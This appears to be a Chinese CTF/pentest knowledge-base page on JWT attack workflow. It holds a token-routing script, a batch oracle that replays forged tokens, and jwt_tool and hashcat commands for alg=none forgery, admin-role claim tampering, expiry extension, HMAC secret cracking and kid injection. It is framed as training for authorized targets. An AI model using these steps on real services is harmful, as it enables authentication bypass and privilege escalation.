# JWT 工具链、操作流程与结果矩阵

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/02-auth/jwt/09-toolchain-operations.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
> **什么时候用**：命中「jwt_tool / hashcat / 工具链 / 攻击流程」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- jwt_tool
- hashcat
- 工具链
- 攻击流程
- 结果矩阵
- JWT
- jwt-cracker
- Burp

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

本文正文按下列小节顺序推进，**每一步的完整命令与脚本在「技术正文」对应小节里**（这类文档以代码体 + 表格为主，按小节读比按 bullet 读快）：

1. 五阶段流程
2. 工具组合
3. token 快速路由器
4. 批量 oracle — 将工具生成的 token 保存为 JSONL，每行格式：{"case":"alg_none_role_admin","token":"..."}。oracle 只做一件事：固定同一个业务接口，记录可比较结果。
5. payload 组织规范 — 每个 case 名必须包含路线和变量，不要只写 test1/test2。
6. 命令速查

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- 复现同一请求两次，状态码 + 响应体 hash 必须稳定；不稳定说明是噪声源（时间戳/随机数/缓存），先校准 baseline。
- 判为命中的最低门槛：同一 session 下**只有被测变量不同**，业务字段（身份/订单状态/flag）发生可复现变化。

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

本篇是 JWT 子目录的执行层：拿到 token 后，先解码和定向路由，再用最少变体打同一业务 oracle。不要让工具“全自动扫一遍”替代判断；每个命中都必须能解释是哪个校验被穿透。

## 输入信号

| 信号 | 工具优先级 | 下一跳 |
|---|---|---|
| `alg=none` 或无签名 token | `jwt_tool -X n` + 手工空签名变体 | `01-alg-none` |
| `RS256/ES256` + 可取公钥 | PEM/JWK 提取 + HS 重签 | `02-algorithm-confusion` |
| `HS256/HS384/HS512` | hashcat `-m 16500` + 规则字典 | `03-weak-key-bruteforce` |
| `kid` 存在 | traversal/SQL/URL/空 key 变体 | `04-kid-injection` |
| `jku/x5u/x5c` 存在 | 自建 JWKS + kid 对齐 | `05-jku-x5u-abuse` |
| `exp/aud/iss/typ/scope` 可疑 | claim 单变量突变 | `06-claim-missing` |
| 错误文本暴露库 | 指纹脚本 + 版本路由 | `08-cve-library` |

## 0. 五阶段流程

```text
捕获 token
  → 解码 header/claims
  → 路由到最可能的 1-2 条技术线
  → 生成单变量 token 变体
  → 对同一业务 oracle 批量验证
  → 输出 Evidence 和下一跳
```

## 1. 工具组合

| 工具 | 用途 | 输出 |
|---|---|---|
| `jwt_tool.py` | 解码、none、kid、claim 修改、常见攻击模块 | token 变体、扫描日志 |
| `hashcat -m 16500` | HMAC secret 爆破 | secret、hashcat potfile |
| `jwt-cracker` | CPU 快速扫短 secret | secret 候选 |
| Burp JWT Editor | 手工改 header/claim、重放 | Repeater 证据 |
| `openssl` | RSA/EC 公钥、证书、x5c 处理 | PEM/JWK 互转材料 |
| Python `pyjwt/cryptography` | 自定义批量生成 | JSONL payload 集 |
| `curl/httpie` | 固定 oracle | 状态码、响应 hash、业务字段 |

## 2. token 快速路由器

```python
#!/usr/bin/env python3
import argparse
import base64
import json

def dec(part):
    part += "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(part.encode()))

def route(header, payload):
    alg = (header.get("alg") or "").upper()
    out = []
    if alg == "NONE" or not header.get("alg"):
        out.append("01-alg-none")
    if alg.startswith("RS") or alg.startswith("ES"):
        out.append("02-algorithm-confusion")
    if alg.startswith("HS"):
        out.append("03-weak-key-bruteforce")
    if "kid" in header:
        out.append("04-kid-injection")
    if any(k in header for k in ("jku", "x5u", "x5c")):
        out.append("05-jku-x5u-abuse")
    if any(k not in payload for k in ("exp", "iss", "aud")) or payload.get("typ") in ("id", "id_token"):
        out.append("06-claim-missing")
    return out or ["08-cve-library"]

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("token")
    args = ap.parse_args()
    h, p, *_ = args.token.split(".")
    header, payload = dec(h), dec(p)
    print(json.dumps({"header": header, "payload": payload, "routes": route(header, payload)}, ensure_ascii=False, indent=2))

if __name__ == "__main__":
    main()
```

## 3. 批量 oracle

将工具生成的 token 保存为 JSONL，每行格式：`{"case":"alg_none_role_admin","token":"..."}`。oracle 只做一件事：固定同一个业务接口，记录可比较结果。

```python
#!/usr/bin/env python3
import argparse
import hashlib
import json
from pathlib import Path
import requests

def h(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def read_jsonl(path):
    for line in Path(path).read_text(encoding="utf-8").splitlines():
        if line.strip():
            yield json.loads(line)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--tokens", required=True)
    ap.add_argument("--cookie", default="")
    ap.add_argument("--header", action="append", default=[])
    args = ap.parse_args()
    base_headers = {}
    if args.cookie:
        base_headers["Cookie"] = args.cookie
    for item in args.header:
        k, v = item.split(":", 1)
        base_headers[k.strip()] = v.strip()
    for item in read_jsonl(args.tokens):
        headers = dict(base_headers)
        headers["Authorization"] = f"Bearer {item['token']}"
        r = requests.get(args.url, headers=headers, timeout=10)
        try:
            body = r.json()
        except Exception:
            body = {"raw": r.text[:300]}
        print(json.dumps({
            "case": item["case"],
            "status": r.status_code,
            "hash": h(r.text),
            "location": r.headers.get("Location", ""),
            "user": body.get("user", body.get("sub", "")) if isinstance(body, dict) else "",
            "role": body.get("role", body.get("scope", "")) if isinstance(body, dict) else "",
            "flag_hit": any(s in r.text for s in ("flag{", "CTF{", "DASCTF{")),
        }, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

判定矩阵：

| 差异 | 解释 |
|---|---|
| `status/hash/user/role` 全变 | token 变体进入业务逻辑 |
| status 相同但 hash 变 | 可能进入不同错误分支，继续看错误文本 |
| 全部同 hash | 当前路线未穿透，换 oracle 或下一条路线 |
| `flag_hit=true` | 固定完整请求/响应，回填 Evidence |

## 4. payload 组织规范

```json
{"case":"baseline","route":"00-overview","token":"<original>"}
{"case":"alg_none_role_admin","route":"01-alg-none","token":"<variant>"}
{"case":"rs_public_as_hs","route":"02-algorithm-confusion","token":"<variant>"}
{"case":"kid_traversal_devnull","route":"04-kid-injection","token":"<variant>"}
{"case":"claim_aud_missing","route":"06-claim-missing","token":"<variant>"}
```

每个 case 名必须包含路线和变量，不要只写 `test1/test2`。

## 5. 命令速查

```bash
# 解码
python3 jwt_tool.py "$TOKEN"

# none
python3 jwt_tool.py "$TOKEN" -X n -I -pc role -pv admin

# HMAC secret
hashcat -m 16500 jwt.txt rockyou.txt
python3 jwt_tool.py "$TOKEN" -C -d rockyou.txt

# claim 单变量
python3 jwt_tool.py "$TOKEN" -I -pc exp -pv 9999999999
python3 jwt_tool.py "$TOKEN" -I -pc role -pv admin

# JWKS/OIDC
curl -s https://target.example/.well-known/openid-configuration
curl -s https://target.example/.well-known/jwks.json
```

## 6. Evidence

| 项 | 记录内容 |
|---|---|
| 原始 token | header/payload、来源、获取时间、业务 oracle |
| 路由理由 | alg/kid/jku/claim/错误文本/库版本等触发信号 |
| payload 集 | JSONL case、token 前缀、路线、单变量说明 |
| oracle 结果 | `status/hash/location/user/role/flag_hit` |
| 成功样本 | 伪造 token 触发身份、权限、数据、订单、flag 差异 |
| 失败样本 | 同一错误 hash、签名错误、claim 错误、key not found、token expired |
| 下一跳 | 命中的路线文件、需要补的公钥/secret/JWKS/日志证据 |
